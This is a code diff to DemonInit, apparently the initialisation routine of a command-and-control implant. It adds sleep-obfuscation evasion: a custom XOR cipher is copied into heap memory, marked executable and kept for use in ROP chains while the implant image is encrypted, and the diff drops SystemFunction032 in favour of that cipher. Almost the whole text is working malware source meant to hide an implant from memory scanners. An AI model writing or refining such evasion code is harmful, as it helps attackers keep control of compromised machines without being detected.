@@ -542,6 +542,31 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     /* Global Objects */
     Instance->Dotnet = NULL;
 
+    /* Allocate heap copy of custom XOR cipher for sleep obfuscation.
+     * Must reside outside agent image since the image is encrypted during sleep.
+     * The function is copied to RX heap memory and used in ROP chains. */
+    {
+        SIZE_T CryptSize  = (SIZE_T)( (ULONG_PTR) ObfXorCryptEnd - (ULONG_PTR) ObfXorCrypt );
+        SIZE_T AllocSize  = CryptSize;
+        PVOID  CryptBuf   = NULL;
+        ULONG  OldProtect = 0;
+
+        if ( NT_SUCCESS( SysNtAllocateVirtualMemory( NtCurrentProcess(), &CryptBuf, 0, &AllocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
+        {
+            MemCopy( CryptBuf, C_PTR( ObfXorCrypt ), CryptSize );
+
+            if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), &CryptBuf, &AllocSize, PAGE_EXECUTE_READ, &OldProtect ) ) )
+            {
+                Instance->Session.CryptFuncAddr = CryptBuf;
+                PRINTF( "Custom crypt function at %p (size: %llu)\n", CryptBuf, (ULONGLONG) CryptSize );
+            }
+        }
+
+        if ( ! Instance->Session.CryptFuncAddr ) {
+            PUTS( "WARNING: Failed to allocate custom crypt — sleep obfuscation will not encrypt" );
+        }
+    }
+
     /* if cfg is enforced (and if sleep obf is enabled)
      * add every address we're going to use to the Cfg address list
      * to not raise an exception while performing sleep obfuscation */
@@ -553,7 +578,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtContinue );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtSetContextThread );
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtGetContextThread );
-        CfgAddressAdd( Instance->Modules.Advapi32, Instance->Win32.SystemFunction032 );
+        /* SystemFunction032 removed — replaced by custom ObfXorCrypt in heap allocation */
 
         /* ekko sleep obf */
         CfgAddressAdd( Instance->Modules.Kernel32, Instance->Win32.WaitForSingleObjectEx );
